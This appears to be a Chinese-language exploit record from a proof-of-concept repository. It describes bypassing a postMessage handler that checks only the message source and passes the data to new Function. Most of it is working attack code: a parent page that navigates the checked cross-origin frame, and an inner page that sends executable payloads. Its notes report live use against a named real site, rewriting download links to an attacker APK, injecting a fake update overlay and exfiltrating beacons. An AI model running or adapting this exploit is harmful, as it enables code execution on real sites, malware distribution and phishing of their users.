# postMessage 仅校验 source 的 executeFunction 绕过：跨源导航被校验子帧 → new Function 在目标源执行（winners.club 实测）

- **code**: postmessage-仅校验-source-的-executefunction-绕过-跨源导航被校验子帧-new
- **kind**: exp
- **category**: auth-bypass
- **component**: landingpoker.js / CloudFront+IIS 静态站
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: Chrome 157 + Playwright（未开 --disable-web-security）实测：攻击页内嵌 https://download.winners.club/，7s 后把 #ifr 导航到攻击者内页，内页 parent.postMessage({action:'executeFunction',functionBody}) 通过 source 校验，在 download.winners.club 源执行：window.__pwned=1、10/10 个下载链接被改写为 https://attacker.test/Winners_Update.apk、全屏仿冒更新层注入、10 条 beacon 外带成功；document.cookie/localStorage/sessionStorage 均为空。产物 D:\ARTEX\data\tasks\614\i8419\ws_exploit.html / ws_inner.html / ws_run_out.txt。
- **path**: pocs/postmessage-仅校验-source-的-executefunction-绕过-跨源导航被校验子帧-new/poc.md
- **tags**: dom-xss,postmessage,new Function,cross-origin frame navigation,window proxy
- **created_at**: 2026-11-04T10:30:04.545Z
- **engine**: https://download.winners.club/

## 描述

适用条件：页面存在 addEventListener('message')，只校验 event.source===某个跨源 iframe 的 contentWindow（或干脆不校验），并把消息内容交给 new Function/eval/字符串 setTimeout。绕过原理：攻击者父页无法伪造 source，但可以把被校验的那个子帧（跨源 WindowProxy）导航到自己的页面；子帧内页面 postMessage 时 source 恰好等于被校验窗口，校验通过，代码在宿主页（目标源）执行。这是"仅校验 source 不校验 origin"的标准击穿方式。

## 用法

```
1) 抓目标页 JS，搜 addEventListener('message') 与 new Function/eval；确认 source 校验对象是页内 iframe。2) 攻击页内嵌目标页，等子帧出现（w.length>0）后把 w.frames[0].location 指向攻击者内页（跨源导航允许；过早导航会被父页 setAttribute('src') 覆盖，需重试）。3) 内页 parent.postMessage 触发宿主的 new Function，在目标源执行。实测坑：w.frames[0] 在无子帧时访问会抛 SecurityError（先判 w.length）；src 以 about:blank 存在时 len 已为 1，需按目标页异步时序重试导航。
```

## 正文

```
# 攻击页（父页）
<iframe id="v" src="https://target.example/landing"></iframe>
<script>
var ready=false, attempts=0;
addEventListener('message', e=>{ if(e.data==='inner-ready') ready=true; });
function nav(){
  if(ready) return; attempts++;
  var w=document.getElementById('v').contentWindow;
  var len=0; try{ len=w.length; }catch(e){}
  if(len>0){ try{ w.frames[0].location='https://attacker.example/inner.html'; }catch(e){} }
}
// 目标页常在异步配置加载后才 setAttribute('src', child)，过早导航会被覆盖：
setTimeout(()=>{ nav(); setInterval(()=>{ if(!ready && attempts<12) nav(); }, 2500); }, 7000);
</script>

# 攻击者内页（被导航进 #ifr，跨源但 source 匹配）
<script>
const BODY = `(function(){
  window.__pwned=1; document.title='PWNED';
  // 此处即目标源：可读写 DOM / cookie / localStorage / fetch 同源资源 / 改写下载链接
})();`;
top.postMessage('inner-ready','*');   // 通知父页停止重试（可选）
parent.postMessage({action:'executeFunction', functionBody: BODY}, '*');
setInterval(()=>parent.postMessage({action:'executeFunction', functionBody: BODY}, '*'), 400);
</script>

```
